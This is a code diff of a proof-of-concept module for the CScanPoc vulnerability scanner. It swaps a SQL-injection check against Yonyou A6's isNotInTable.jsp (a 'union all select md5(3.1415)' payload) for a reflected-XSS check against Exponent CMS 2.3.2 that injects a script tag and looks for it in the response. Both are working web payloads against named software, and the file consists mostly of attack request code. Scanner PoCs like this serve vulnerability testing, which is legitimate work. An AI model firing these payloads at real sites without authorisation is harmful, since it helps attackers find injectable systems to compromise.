@@ -1,29 +1,28 @@
 # coding: utf-8
-import requests
-
+import urllib2
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 
 class Vuln(ABVuln):
-    vuln_id = 'Yonyou_0101' # 平台漏洞编号，留空
-    name = '用友致远A6协同系统 /isNotInTable.jsp SQL Injection' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
-    disclosure_date = '2015-08-31'  # 漏洞公布时间
+    vuln_id = 'ExponentCMS_0101' # 平台漏洞编号，留空
+    name = 'Exponent CMS 2.3.2 /exponent/index.php Reflected XSS' # 漏洞名称
+    level = VulnLevel.LOW # 漏洞危害级别
+    type = VulnType.XSS # 漏洞类型
+    disclosure_date = '2015-01-29'  # 漏洞公布时间
     desc = '''
-    用友 mysql+jsp 注入
+    Exponent CMS 2.3.2 /exponent/index.php Reflected XSS'
     ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源http://wooyun.org/bugs/wooyun-2010-0110312
+    ref = 'http://www.securityfocus.com/bid/59887/' # 漏洞来源
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = 'Yonyou'  # 漏洞应用名称
-    product_version = 'Unknown'  # 漏洞应用版本
+    product = 'ExponentCMS'  # 漏洞应用名称
+    product_version = '2.3.2'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = '1f9b0911-3a30-40e6-8142-ddd7599f322a' # 平台 POC 编号，留空
+    poc_id = '764aecac-f3fc-40ad-94af-136a51c1974a' # 平台 POC 编号，留空
     author = 'hyhmnn'  # POC编写者
     create_date = '2018-05-29' # POC创建时间
 
@@ -34,11 +33,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                     target=self.target, vuln=self.vuln))
-            url = self.target
-            verify_url=('%s/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids='
-                        '(17) union all select md5(3.1415)#') % url
-            req = requests.get(verify_url)
-            if req.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in req.content:
+            payload = '/exponent/index.php?controller=search&src=f324e%22><script>alert(1)</script>9cbae6bf552&action=search&search_string=test&int=%0d'
+            verify_url = self.target + payload
+            req = urllib2.Request(verify_url)
+            content = urllib2.urlopen(req).read()
+            if '<script>alert(1)</script>' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
             
